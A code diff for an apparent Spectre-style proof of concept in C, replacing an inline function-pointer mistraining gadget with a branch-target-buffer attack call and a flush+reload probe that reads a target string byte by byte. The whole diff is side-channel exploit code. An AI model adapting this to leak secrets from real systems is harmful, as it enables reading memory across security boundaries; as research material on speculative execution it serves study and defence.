@@ -5,38 +5,21 @@
 #include <string.h>
 
 #include "../sidechannel/flush_reload.h"
+#include "btb.h"
 
 
 #define CACHE_MISS 80
 #define PAGESIZE 4096
-int (*fp1)(char *info);
-int (**fp2)(char *info);
-char *probe_buf;
+//uint8_t useless[50]; // int is 4 bytes: need a 33-byte or greater offset for the thing to work
+//int (*fp1)(char *info);
+//int (**fp2)(char *info);
+char *oracle_block;
 int junk;
-//int results[256];
+int* results;
 
-int attacker(char *info){
-    return probe_buf[*info * PAGESIZE];
-}
-
-int safe(){
-    return 42;
-}
-
-int victim(char *info, int input){
-    static int result;
-    for (int i =0; i < 100; i++){
-        input += i;
-        junk += input & i;
-    }
-    //_mm_mfence(); // removing the fence breaks attack???
-    result = (*fp2)(info);
-
-    return result;
-}
 
 void readMemoryByte(char *ctl, uint8_t value[2], int score[2]){
-    int results[256]; // changing this from non-static to static changes the amount that the rsp is decremented, probably changing the outcome
+    //static int results[256]; // changing this from non-static to static changes the amount that the rsp is decremented, probably changing the outcome
     static int tries, i, j, k, mix_i;
     static char trash = '#';
 
@@ -46,7 +29,8 @@ void readMemoryByte(char *ctl, uint8_t value[2], int score[2]){
     
     for (tries = 19; tries > 0; tries--){
         _mm_mfence();
-        fp1 = &attacker;
+        btb_atk(ctl);
+        /* fp1 = &attacker;
         fp2 = &fp1;
 
         _mm_mfence();
@@ -56,7 +40,7 @@ void readMemoryByte(char *ctl, uint8_t value[2], int score[2]){
 
         _mm_mfence();
 
-        flush(probe_buf, PAGESIZE);
+        flush(oracle_block, PAGESIZE);
         _mm_mfence();
         
         fp1 = &safe;
@@ -66,10 +50,10 @@ void readMemoryByte(char *ctl, uint8_t value[2], int score[2]){
         _mm_clflush((void*)fp1);
         _mm_clflush((void*)fp2);
         _mm_mfence();
-        junk ^= victim(ctl,0);
+        junk ^= victim(ctl,0); */
         //junk ^= victim(&sec2,0);
         _mm_mfence();
-        probe(probe_buf,80,PAGESIZE,results);
+        probe(oracle_block,80,PAGESIZE,results);
         // locate top two results
         _mm_mfence();
         j = k = -1;
@@ -97,12 +81,13 @@ void readMemoryByte(char *ctl, uint8_t value[2], int score[2]){
 void main(){
     char* target = "zoo";
     size_t malicious_x = 0;
-    probe_buf = malloc(256 * PAGESIZE);
-    memset(probe_buf, 1, 256*PAGESIZE);
-    flush(probe_buf, PAGESIZE);
+    oracle_block = malloc(256 * PAGESIZE);
+    memset(oracle_block, 1, 256*PAGESIZE);
+    flush(oracle_block, PAGESIZE);
+    //printf("%d\n", sizeof(useless));
 
-    //fp1 = malloc(sizeof(&attacker));
-    //fp1 = malloc(sizeof(&fp2));
+    results = malloc(256*sizeof(int)); // on heap ok
+    memset(results, 0, 256*sizeof(int));
 
     int score[2], len = 3;
     uint8_t value[2];
@@ -121,5 +106,5 @@ void main(){
         printf("\n");
     }
 
-    free(probe_buf);
+    free(oracle_block);
 }
